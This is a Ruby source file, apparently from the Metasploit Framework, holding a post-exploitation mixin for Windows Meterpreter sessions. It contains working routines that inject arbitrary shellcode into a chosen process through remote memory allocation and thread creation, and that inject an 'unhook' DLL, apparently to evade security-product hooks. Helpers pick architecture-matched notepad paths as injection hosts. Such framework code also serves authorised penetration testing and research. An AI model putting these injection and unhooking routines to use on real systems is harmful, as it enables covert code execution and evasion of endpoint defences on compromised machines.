# -*- coding: binary -*-

require 'msf/core/post/windows/reflective_dll_injection'

module Msf
class Post
module Windows

module Process

  include Msf::Post::Windows::ReflectiveDLLInjection

  # Checks the Architeture of a Payload and PID are compatible
  # Returns true if they are false if they are not
  def arch_check(test_arch, pid)
    # get the pid arch
    client.sys.process.processes.each do |p|
      # Check Payload Arch
      if pid == p["pid"]
        return test_arch == p['arch']
      end
    end
  end

  # returns the path to the notepad process based on syswow extension
  def get_notepad_pathname(bits, windir, client_arch)
    if bits == ARCH_X86 and client_arch == ARCH_X86
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif bits == ARCH_X64 and client_arch == ARCH_X64
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif bits == ARCH_X64 and client_arch == ARCH_X86
      cmd = "#{windir}\\Sysnative\\notepad.exe"
    elsif bits == ARCH_X86 and client_arch == ARCH_X64
      cmd = "#{windir}\\SysWOW64\\notepad.exe"
    end
    return cmd
  end

  #
  # Injects shellcode to a process, and executes it.
  #
  # @param shellcode [String] The shellcode to execute
  # @param base_addr [Integer] The base address to allocate memory
  # @param pid       [Integer] The process ID to inject to
  #
  # @return [Boolean] True if successful, otherwise false
  #
  def execute_shellcode(shellcode, base_addr=nil, pid=nil)
    pid ||= session.sys.process.getpid
    host  = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
    if base_addr.nil?
      shell_addr = host.memory.allocate(shellcode.length)
    else
      shell_addr = host.memory.allocate(shellcode.length, nil, base_addr)
    end

    host.memory.protect(shell_addr)

    if host.memory.write(shell_addr, shellcode) < shellcode.length
      vprint_error("Failed to write shellcode")
      return false
    end

    vprint_status("Creating the thread to execute in 0x#{shell_addr.to_s(16)} (pid=#{pid.to_s})")
    thread = host.thread.create(shell_addr,0)
    unless thread.instance_of?(Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Thread)
      vprint_error("Unable to create thread")
      nil
    end
    thread
  end

  def inject_unhook(proc, bits, delay_sec)
    if bits == ARCH_X64
      dll_file_name = 'x64.dll'
    elsif bits == ARCH_X86
      dll_file_name = 'x86.dll'
    else
      return false
    end
    dll_file = MetasploitPayloads.meterpreter_ext_path('unhook', dll_file_name)
    dll, offset = inject_dll_into_process(proc, dll_file)
    proc.thread.create(dll + offset, 0)
    Rex.sleep(delay_sec)
  end

  # Determines if a PID actually exists
  def has_pid?(pid)
    procs = []
    begin
      procs = client.sys.process.processes
    rescue Rex::Post::Meterpreter::RequestError
      print_error("Unable to enumerate processes")
      return false
    end

    procs.each do |p|
      found_pid = p['pid']
      return true if found_pid == pid
    end

    print_error("PID #{pid.to_s} does not actually exist.")

    return false
  end
end # Process
end # Windows
end # Post
end # Msf
